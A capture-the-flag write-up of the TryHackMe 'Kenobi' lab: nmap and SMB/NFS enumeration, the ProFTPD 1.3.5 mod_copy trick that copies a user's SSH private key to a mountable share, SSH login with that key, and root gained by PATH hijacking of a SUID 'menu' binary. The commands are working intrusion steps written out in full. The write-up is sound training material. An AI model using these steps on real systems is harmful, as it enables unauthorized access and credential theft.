# THM - Kenobi

## Date Commenced: 16MAR2022

A guided room with a bit of this and a bit of that.

---
## IP Address

### Attempt 1
export IP=10.10.254.137


---
## Rustscan Results
Ports open are:

Well, **Rustscan** lied to me again so heading to nmap to get the open ports:


---
## Nmap
Start with a simple scan to get the open ports:

> nmap 10.10.254.137 -vvv -oN Results/nmap01.log

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-16 09:16 EDT
Initiating Ping Scan at 09:16
Scanning 10.10.254.137 [2 ports]
Completed Ping Scan at 09:16, 0.36s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 09:16
Completed Parallel DNS resolution of 1 host. at 09:16, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 09:16
Scanning 10.10.254.137 [1000 ports]
Discovered open port 21/tcp on 10.10.254.137
Discovered open port 139/tcp on 10.10.254.137
Discovered open port 111/tcp on 10.10.254.137
Discovered open port 445/tcp on 10.10.254.137
Discovered open port 22/tcp on 10.10.254.137
Discovered open port 80/tcp on 10.10.254.137
Increasing send delay for 10.10.254.137 from 0 to 5 due to 72 out of 239 dropped probes since last increase.
Increasing send delay for 10.10.254.137 from 5 to 10 due to max_successful_tryno increase to 4
Discovered open port 2049/tcp on 10.10.254.137
Completed Connect Scan at 09:17, 28.40s elapsed (1000 total ports)
Nmap scan report for 10.10.254.137
Host is up, received syn-ack (0.29s latency).
Scanned at 2022-03-16 09:16:40 EDT for 28s
Not shown: 993 closed tcp ports (conn-refused)
PORT     STATE SERVICE      REASON
21/tcp   open  ftp          syn-ack
22/tcp   open  ssh          syn-ack
80/tcp   open  http         syn-ack
111/tcp  open  rpcbind      syn-ack
139/tcp  open  netbios-ssn  syn-ack
445/tcp  open  microsoft-ds syn-ack
2049/tcp open  nfs          syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 28.81 seconds
```

Now do a more comprehensive scan on those open ports (choose two possibly closed ports to give nmap a chance to scan the OS properly):

> nmap 10.10.254.137 -sC -sV -A -p 21,22,80,111,139,446,2049,6500,6501 -oN Results/nmap02.log

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-16 09:19 EDT
Nmap scan report for 10.10.254.137
Host is up (0.31s latency).

PORT     STATE  SERVICE     VERSION
21/tcp   open   ftp         ProFTPD 1.3.5
22/tcp   open   ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
80/tcp   open   http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-title: Site doesn't have a title (text/html).
111/tcp  open   rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      41695/tcp   mountd
|   100005  1,2,3      45541/udp   mountd
|   100005  1,2,3      48809/udp6  mountd
|   100005  1,2,3      51981/tcp6  mountd
|   100021  1,3,4      32811/tcp6  nlockmgr
|   100021  1,3,4      44917/tcp   nlockmgr
|   100021  1,3,4      47412/udp6  nlockmgr
|   100021  1,3,4      53005/udp   nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp  open   netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
446/tcp  closed ddm-rdb
2049/tcp open   nfs_acl     2-3 (RPC #100227)
6500/tcp closed boks
6501/tcp closed boks_servc
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h39m59s, deviation: 2h53m14s, median: -1s
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2022-03-16T13:19:26
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2022-03-16T08:19:26-05:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.49 seconds
```

Use **nmap** again to enumerate the **SMB** shares:

> nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.254.137 -oN Results/nmap03.log

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-16 09:22 EDT
Nmap scan report for 10.10.254.137
Host is up (0.33s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.254.137\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.254.137\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.254.137\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

Nmap done: 1 IP address (1 host up) scanned in 45.15 seconds
```


---
##smbclient
Connect to the *anonymous* share using **smbclient**:

> smbclient //10.10.254.137/anonymous

```
Enter WORKGROUP\kali's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Sep  4 06:49:09 2019
  ..                                  D        0  Wed Sep  4 06:56:07 2019
  log.txt                             N    12237  Wed Sep  4 06:49:09 2019

                9204224 blocks of size 1024. 6877108 blocks available
smb: \> cat log.txt
cat: command not found
smb: \> exit
```

Use **smbget** to download the file:

> smbget -R smb://10.10.254.137/anonymous

Some useful info there...


---
## Port 111 RPCBind - Nmap again
Time to enumerate port 111 *RPCBind*:

> nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.254.137 -oN Results/nmap04.log

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-16 09:31 EDT
Nmap scan report for 10.10.254.137
Host is up (0.22s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /var *

Nmap done: 1 IP address (1 host up) scanned in 2.11 seconds
```


---
## port 21 ProFTPD
Lets see what *FTP* can give me:

> nc -nv 10.10.254.137 21

```
(UNKNOWN) [10.10.254.137] 21 (ftp) open
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.254.137]
```

Is that vulnerable?

> searchsploit proftpd 1.3.5

```
------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                |  Path
------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                                                                     | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                                                           | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)                                                                       | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy                                                                                                     | linux/remote/36742.txt
------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

Looks like some exploits to be had. Try one out:

```
┌──(kali㉿kali)-[~/THM/Kenobi]
└─$ nc 10.10.254.137 21    
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.254.137]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```

Now mount the */var* directory locally and get the *id_rsa* file.

```
┌──(kali㉿kali)-[~/THM/Kenobi]
└─$ sudo mkdir /mnt/kenobinfs
[sudo] password for kali: 
                                                                                                                                                                
┌──(kali㉿kali)-[~/THM/Kenobi]
└─$ sudo mount 10.10.254.137:/var /mnt/kenobinfs
                                                                                                                                                                
┌──(kali㉿kali)-[~/THM/Kenobi]
└─$ ls -lashS /mnt/kenobinfs
total 56K
4.0K drwxr-xr-x 14 root root    4.0K Sep  4  2019 .
4.0K drwxr-xr-x  4 root root    4.0K Mar 16 09:42 ..
4.0K drwxr-xr-x  2 root root    4.0K Sep  4  2019 backups
4.0K drwxr-xr-x  9 root root    4.0K Sep  4  2019 cache
4.0K drwxrwxrwt  2 root root    4.0K Sep  4  2019 crash
4.0K drwxr-xr-x 40 root root    4.0K Sep  4  2019 lib
4.0K drwxrwsr-x  2 root staff   4.0K Apr 12  2016 local
4.0K drwxrwxr-x 10 root crontab 4.0K Sep  4  2019 log
4.0K drwxrwsr-x  2 root mail    4.0K Feb 26  2019 mail
4.0K drwxr-xr-x  2 root root    4.0K Feb 26  2019 opt
4.0K drwxr-xr-x  2 root root    4.0K Jan 29  2019 snap
4.0K drwxr-xr-x  5 root root    4.0K Sep  4  2019 spool
4.0K drwxrwxrwt  6 root root    4.0K Mar 16 09:39 tmp
4.0K drwxr-xr-x  3 root root    4.0K Sep  4  2019 www
   0 lrwxrwxrwx  1 root root       9 Sep  4  2019 lock -> /run/lock
   0 lrwxrwxrwx  1 root root       4 Sep  4  2019 run -> /run
                                                                                                                                                                
┌──(kali㉿kali)-[~/THM/Kenobi]
└─$ ls -lashS /mnt/kenobinfs/tmp
total 28K
4.0K drwxrwxrwt  6 root root 4.0K Mar 16 09:39 .
4.0K drwxr-xr-x 14 root root 4.0K Sep  4  2019 ..
4.0K drwx------  3 root root 4.0K Sep  4  2019 systemd-private-2408059707bc41329243d2fc9e613f1e-systemd-timesyncd.service-a5PktM
4.0K drwx------  3 root root 4.0K Mar 16 09:10 systemd-private-61be61c011b14cbf909b30364f9626d8-systemd-timesyncd.service-0e0J6n
4.0K drwx------  3 root root 4.0K Sep  4  2019 systemd-private-6f4acd341c0b40569c92cee906c3edc9-systemd-timesyncd.service-z5o4Aw
4.0K drwx------  3 root root 4.0K Sep  4  2019 systemd-private-e69bbb0653ce4ee3bd9ae0d93d2a5806-systemd-timesyncd.service-zObUdn
4.0K -rw-r--r--  1 kali kali 1.7K Mar 16 09:39 id_rsa
                                                                                                                                                                
┌──(kali㉿kali)-[~/THM/Kenobi]
└─$ cp /mnt/kenobinfs/tmp/id_rsa .                                       
                                                                                                                                                                
┌──(kali㉿kali)-[~/THM/Kenobi]
└─$ ls                          
id_rsa  Images  log.txt  README.md  Results
```

Use the *id_ras* file to **SSH** into the victim machine and poke around:

```┌──(kali㉿kali)-[~/THM/Kenobi]
└─$ sudo chmod 600 id_rsa                       
                                                                                                                                                                
┌──(kali㉿kali)-[~/THM/Kenobi]
└─$ ssh -i id_rsa kenobi@10.10.254.137
The authenticity of host '10.10.254.137 (10.10.254.137)' can't be established.
ED25519 key fingerprint is SHA256:GXu1mgqL0Wk2ZHPmEUVIS0hvusx4hk33iTcwNKPktFw.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.254.137' (ED25519) to the list of known hosts.
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

103 packages can be updated.
65 updates are security updates.


Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kenobi@kenobi:~$ ls
share  user.txt
kenobi@kenobi:~$ cat user.txt
d0b0f3f53b6caa532a83915e19224899
```


---
## Linux Enum
Usual suspects. Dont have the password so no **sudo**.

Try **SUID**

> find / -perm -u+s -type f 2> /dev/null

```
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6
```


---
## /usr/bin/menu
OK..so it seems that this *menu* file runs as *root* and runs without full path names. So...

```
kenobi@kenobi:~$ cd /tmp
kenobi@kenobi:/tmp$ echo /bin/sh > curl
kenobi@kenobi:/tmp$ chmod 777 curl
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
# ls
curl  systemd-private-61be61c011b14cbf909b30364f9626d8-systemd-timesyncd.service-CBmuaR
# whoami
root
```


---
## Root
Pretty easy to find *root.txt* from there:

```
# cd ..
# ls
bin   dev  home        initrd.img.old  lib64       media  opt   root  sbin  srv  tmp  var      vmlinuz.old
boot  etc  initrd.img  lib             lost+found  mnt    proc  run   snap  sys  usr  vmlinuz
# cd root
# ls
root.txt
# cat root.txt
177b3cd8562289f37382721c28381f02
```


---
## What did I learn?

1. I understand the **PATH** a little better now. If the full path is not specified in the command, you can create your own and export the files location into the **PATH**. I have seen this before but not fully followed it.
2. **smbget** is a thing.
3. **Rustscan** is not always reliable



